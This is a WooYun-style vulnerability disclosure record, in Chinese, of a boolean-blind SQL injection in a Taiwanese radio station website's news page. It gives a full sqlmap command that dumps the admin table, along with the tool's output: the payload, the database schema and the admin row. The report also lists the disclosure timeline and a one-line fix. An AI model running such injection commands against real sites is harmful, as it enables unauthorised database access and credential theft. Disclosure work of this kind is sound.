wybug_title: 鳳鳴電臺某處存在SQL植入漏洞導致管理員明文密碼泄露（臺灣地區）
wybug_status: 已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理
wybug_detail:
漏洞详情 披露状态：   									2015-11-20：	细节已通知厂商并且等待厂商处理中									2015-11-24：	厂商已经确认，细节仅向厂商公开									2015-12-04：	细节向核心白帽子及相关领域专家公开									2015-12-14：	细节向普通白帽子公开									2015-12-24：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： 鳳鳴電臺某處存在SQL植入漏洞導致管理員明文密碼泄露 详细说明：  地址：http://**.**.**.**/news_detail.asp?NewsId=6251
python sqlmap.py -u "http://**.**.**.**/news_detail.asp?NewsId=6251" -p NewsId --technique=B --random-agent --batch --threads=10 -T admin -C id,name,password,author --dump
   漏洞证明：  
---Parameter: NewsId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: NewsId=6251 AND 7831=7831---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASPback-end DBMS: Microsoft Accesscurrent user:	Nonecurrent user is DBA:	NoneDatabase: Microsoft_Access_masterdb+--------+---------+| Table  | Entries |+--------+---------+| news   | 4730    || admin  | 2       || banner | 2       |+--------+---------+sqlmap resumed the following injection point(s) from stored session:---Parameter: NewsId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: NewsId=6251 AND 7831=7831---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdbTable: admin[9 columns]+-----------+-------------+| Column    | Type        |+-----------+-------------+| app       | numeric     || author    | non-numeric || id        | numeric     || name      | non-numeric || newsid    | numeric     || password  | non-numeric || prodid    | numeric     || publisher | non-numeric || source    | non-numeric |+-----------+-------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: NewsId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: NewsId=6251 AND 7831=7831---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdbTable: admin[1 entry]+----+--------+--------------+-----+--------------------+-----------+---------------+---------------+--------+| id | newsid | prodid       | app | source             | publisher | name          | password      | author |+----+--------+--------------+-----+--------------------+-----------+---------------+---------------+--------+| 1  | 6251   | 151112172034 | 1   | ??^\xe3d\xad?S\xf0 | <blank>   | <%=download%> | <%=download%> | <blank> |+----+--------+--------------+-----+--------------------+-----------+---------------+---------------+--------+
   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-11-24 08:25 厂商回复： 感謝通報 最新状态： 2016-01-07：HITCON 於接獲通報後除 email 該電台網站所示之服務信箱外，亦曾致電該電台告知此漏洞，但對方至今仍無回應。
